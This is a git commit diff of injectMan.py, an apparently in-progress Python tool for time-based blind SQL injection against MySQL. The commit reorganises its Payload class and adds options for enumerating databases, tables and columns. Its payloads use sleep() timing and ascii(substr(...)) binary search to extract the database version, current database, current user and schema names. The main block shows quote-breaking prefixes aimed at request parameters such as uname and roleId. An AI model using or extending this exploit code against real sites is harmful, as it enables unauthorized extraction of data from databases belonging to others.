7c2ec721e75d2b612ba005bc2f6ab253b72064b9
nancheal <nancheal@126.com>
2017-10-06 15:43:18 +0800

    0.2

--- injectMan.py
+++ injectMan.py
@@ -33,39 +33,7 @@ class File:
             fileData = f.read()
             HTTPData = HTTPRequest(fileData)
         return HTTPData
-class Payload:
-    """
-    Generate payload by input flag
-    """
-    def reduceTimes(self,symbol,value,pos=None):
-        if not pos:
-            pass
-    def withoutQuoteandequal(self,symbol,value,pos=None):
-        if not pos:
-            key = 'length(@@version){}{} and sleep(1)'
-            test_Payload = key.format(symbol,value)
-        else:
-            key = 'ascii(substring(@@version from {} for 1)){}{} and sleep(1)'
-            test_Payload = key.format(pos,symbol,value)
-        return test_Payload
-    def currentDb(self,symbol,value,pos=None):
-        if not pos:
-            key = 'length((select database()))'
-        else:
-            key = 'ascii(substr((select database()),{},1))'.format(pos)
-        currentDb_Payload = self.basic(key,symbol,value)
-        return currentDb_Payload
-    def currentUser(self,symbol,value,pos=None):
-        if not pos:
-            key = 'length((select user()))'
-        else:
-            key = 'ascii(substr((select user()),{},1))'.format(pos)
-        currentUser_Payload = self.basic(key,symbol,value)
-        return currentUser_Payload
-    def basic(self,key,symbol,value):
-        basicpayload = "if({}{}{},sleep(0.1),0)"
-        finalPayload = basicpayload.format(key,symbol,value)  
-        return finalPayload     
+
 class Join:
     """
     Join post data
@@ -156,19 +124,20 @@ class Mylog:
     def __init__(self):
         self.logger = logging.getLogger("injectManlog")
         self.logger.setLevel(logging.INFO)
-        self.colorSwitch = Switch(self.colorMap())
-        self.numSwitch = Switch(self.numMap())
+        self.Switch = Switch()
     def addLevel(self, levelInt, levelName):
         logging.addLevelName(levelInt, levelName)
     def toLog(self, levelName, message, option):
-        basicFmt = self.colorSwitch.getValue(levelName,msg = "[%(asctime)s] [%(levelname)s] %(message)s")
-        timeFmt = "%H:%M:%S"
-        formatter = logging.Formatter(fmt = basicFmt,datefmt = timeFmt)
+        colorFmt = self.Switch.getValue(self.colorMap(), levelName, mainMsg = self.outFmt)
+        formatter = logging.Formatter(fmt = colorFmt,datefmt = self.timeFmt)
         consoleHandler = ConsoleHandler()
         consoleHandler.setFormatter(formatter)
         self.logger.addHandler(consoleHandler)
-        intLevel = self.numSwitch.getValue(levelName)
+        intLevel = self.Switch.getValue(self.numMap(), levelName)
         self.logger.log(intLevel,message + self.ENDC,extra=option)
+    def toFormat(self, basicFmt, timeFmt):
+        self.outFmt = basicFmt
+        self.timeFmt = timeFmt
     def colorMap(self):
         colorMap = {
                 "result":self.RESULT,
@@ -187,40 +156,41 @@ class Mylog:
         }
         return numMap
 class Switch:
-    def __init__(self, switcher):
-        self.switcher = switcher
-    def getValue(self, key, msg = None):
-        if msg:
-            toReturn = self.returnValue(key) + msg
+    def __init__(self):
+        pass
+    def getValue(self, switchDict, key, mainMsg = None):
+        if mainMsg:
+            toReturn = self.returnValue(switchDict, key) + mainMsg
         else:
-            toReturn = self.returnValue(key)
+            toReturn = self.returnValue(switchDict, key)
         return toReturn
-    def returnValue(self, key):
-        return self.switcher.get(key)
+    def returnValue(self, switchDict, key):
+        return switchDict.get(key)
 class Inject:
     """
     Inject main code
     """
-    def __init__(self,fileName):
+    def __init__(self, fileName):
         self.nFile = File()
         self.rFile = self.nFile.readFile(fileName)
         self.nJoin = Join(self.rFile)
         self.nRequest = Request(self.rFile)
         self.log = Mylog()
         self.log.addLevel(100,"RESULT")
-        self.funcSwitch = Switch(self.funcMap())
-    def inJect(self,infDict,funcStr):
-        Func = self.funcSwitch.getValue(funcStr)
+        self.log.toFormat("[%(asctime)s] [%(levelname)s] %(message)s","%H:%M:%S")
+        self.funcSwitch = Switch()
+    def inJect(self, infDict, optionDict):
+        Func = self.optTofunc(optionDict)
         lengthPoc = None
-        length = self.binarySearch(infDict,Func,lengthPoc)
+        length = self.binarySearch(infDict, Func, lengthPoc)
         self.log.toLog("result","Current length is {}".format(length),option={'same_line':False})
         name = ''
         for namePos in range(1,length+1):
-            charAscii = self.binarySearch(infDict,Func,namePos)
+            charAscii = self.binarySearch(infDict, Func, namePos)
             name = name + chr(charAscii)
             self.log.toLog("result","Current name is {}".format(name),option={'same_line':True})
         sys.stderr.write('\n')
-    def binarySearch(self,infDict,Func,pos):
+    def binarySearch(self, infDict, Func, pos):
         self.left = 0
         self.right = 127
         nPayload = Payload()
@@ -236,7 +206,7 @@ class Inject:
             judgeResult = self.binaryJudge(timeTmp,1)
             if judgeResult:
                 return self.mid
-    def burteSearch(self,infDict,Func,pos):
+    def burteSearch(self, infDict, Func, pos):
         self.symbol = "="
         nPayload = Payload()
         for i in range(1,127):
@@ -262,17 +232,64 @@ class Inject:
         elif timeTmp < stander and self.symbol == "<":
             self.symbol = ">"
         return 0
-    def funcMap(self):
-        funcMap = {
-            "--current-db":"currentDb",
-            "--current-user":"currentUser",
-            "--withoutQuoteandequal":"withoutQuoteandequal",
-            "--reduceTimes":"reduceTimes"
-        }
-        return funcMap
+
+    def optTofunc(self, optionDict):
+        if optionDict.has_key('--dump') and optionDict['--dump']:
+            returnValue = "Dump"
+        elif optionDict.has_key('--columns') and optionDict['--columns']:
+            returnValue = "Columns"
+        elif optionDict.has_key('--tables') and optionDict['--tables']:
+            returnValue = "Tables"
+        elif optionDict.has_key('--dbs') and optionDict['--dbs']:
+            returnValue = "Dbs"
+        elif optionDict.has_key('--current-db') and optionDict['--current-db']:
+            returnValue = "currentDb"
+        elif optionDict.has_key('--current-user') and optionDict['--current-user']:
+            returnValue = "currentUser"
+        return returnValue
+class Payload:
+    """
+    Generate payload by input flag
+    """
+    def reduceTimes(self,symbol,value,pos=None):
+        if not pos:
+            pass
+    def withoutQuoteandequal(self,symbol,value,pos=None):
+        if not pos:
+            key = 'length(@@version){}{} and sleep(1)'
+            test_Payload = key.format(symbol,value)
+        else:
+            key = 'ascii(substring(@@version from {} for 1)){}{} and sleep(1)'
+            test_Payload = key.format(pos,symbol,value)
+        return test_Payload
+    def Dbs(self, symbol, value ,pos = None):
+        if not pos:
+            key = 'length((select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1))'
+        else:
+            key = 'ascii(substr((select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1),{},1))'.format(pos)
+        currentDbs_Payload = self.basic(key, symbol ,value)
+        return currentDbs_Payload
+    def currentDb(self,symbol,value,pos=None):
+        if not pos:
+            key = 'length((select database()))'
+        else:
+            key = 'ascii(substr((select database()),{},1))'.format(pos)
+        currentDb_Payload = self.basic(key,symbol,value)
+        return currentDb_Payload
+    def currentUser(self,symbol,value,pos=None):
+        if not pos:
+            key = 'length((select user()))'
+        else:
+            key = 'ascii(substr((select user()),{},1))'.format(pos)
+        currentUser_Payload = self.basic(key,symbol,value)
+        return currentUser_Payload
+    def basic(self,key,symbol,value):
+        basicpayload = "if({}{}{},sleep(0.1),0)"
+        finalPayload = basicpayload.format(key,symbol,value)  
+        return finalPayload
 if __name__ == "__main__":
     nInject = Inject('1.txt')
-    nInject.inJect({'param':'uname','prefix':'\' or ','suffix':' #'},'--current-db')
+    nInject.inJect({'param':'uname','prefix':'\' or ','suffix':' #'},{'--dbs':True,'--current-user':False,'--current-db':False})
     #nInject.inJect({'param':'roleId','prefix':'\' or ','suffix':' %23'},{'--current-db':True})
     #nInject.inJect({'param':'uname','prefix':'\' or ','suffix':' %23'},{'--current-db':False,'--current-user':True})
     #nInject.inJect({'param':'certificateId','prefix':'\' or ','suffix':' and \'1\'=\'1'},{'--current-db':False,'--current-user':True,'--withoutQuoteandequal':False,'--reduceTimes':False})
